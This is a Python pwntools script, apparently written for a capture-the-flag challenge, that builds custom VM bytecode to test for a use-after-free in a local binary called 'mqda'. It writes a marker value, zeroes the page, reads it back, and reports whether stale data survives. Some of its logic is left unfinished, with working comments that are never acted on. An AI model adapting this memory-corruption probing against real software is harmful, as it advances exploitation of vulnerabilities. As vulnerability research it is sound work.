#!/usr/bin/env python3
"""
Verify UAF: After freeing page 0x20000, read from it and see what we get
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

code_addr = 0x10000

code = b''

# Step 1: Write known value to page 0x20000
code += mov_reg_imm(15, 0x20000)  
code += mov_reg_imm(0, 0xDEADBEEF)
code += push_reg(0)

# Step 2: Zero out page 0x20000 to trigger cleanup
# Write zeros to offsets 0-252 in steps of 4 
for offset in range(0, 256, 4):
    vm_addr = 0x20000 + offset
    if offset < 4:
        # Special handling for offset 0: SP=vm_addr, then push writes at [(SP&0xFF)+4]
        # So for vm_addr=0x20000, we need (SP&0xFF)+4 = 0+4 = 4, but we want offset 0
        # Actually page[0..3] is the header, data starts at page[4]
        # So vm_addr 0x20000 maps to page[4] (data byte 0)
        # PUSH at SP=0x1FFFC writes to page[(0xFC+4)] = page[0x100] when SP&0xFF=0xFC
        # Actually that's data byte 0xFC
        # This is getting complex. Let me use STORE instead.
        pass
    else:
        sp = (vm_addr >> 8) << 8 | (offset - 4)
        code += mov_reg_imm(15, sp)
        code += mov_reg_imm(0, 0)
        code += push_reg(0)

# Use STORE for more reliable zeroing
# STORE: mode 3, opcode 1 => 0x61, addr_reg, val_reg
# But we need the address in a register...

# Actually let's just use many PUSHes to cover most of the page
# Then read back and see if it's different

# Step 3: Read from the (possibly freed) page
code += mov_reg_imm(15, 0x20000)
code += pop_reg(0)

# Step 4: If r0 != 0 (page was freed and reused, or has garbage), 
#         we detect UAF
code += mov_reg_imm(1, 0)
code += bytes([0x2D, 0, 1])  # CMP r0, r1

# If equal (r0 == 0), jump to HLT
# If not equal (r0 != 0), fall through to ILLEGAL
jne_addr = code_addr + len(code) + 6 + 2 + 1
code += mov_reg_imm(2, jne_addr)
code += bytes([0x10, 2])  # JNE
code += bytes([0xFF])     # ILLEGAL - r0 != 0 (UAF detected, stale/garbage data)
code += hlt()             # TERMINATED - r0 == 0 (page zeroed properly)

print(f"[*] Code length: {len(code)} bytes")

p = process(['./mqda'])
p.recvuntil(b'Code Address> ')
p.sendline(str(code_addr).encode())
p.recvuntil(b'Code Length> ')
p.sendline(str(len(code)).encode())
p.recvuntil(b'Code> ')
p.send(code)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr).encode())

output = p.recvall(timeout=3)
print(f"Output: {output}")

if b'ILLEGAL' in output:
    print("[+] UAF confirmed! Read non-zero from freed page")
elif b'TERMINATED' in output:
    print("[*] Read zero from page (might still be UAF with zero data)")

p.close()
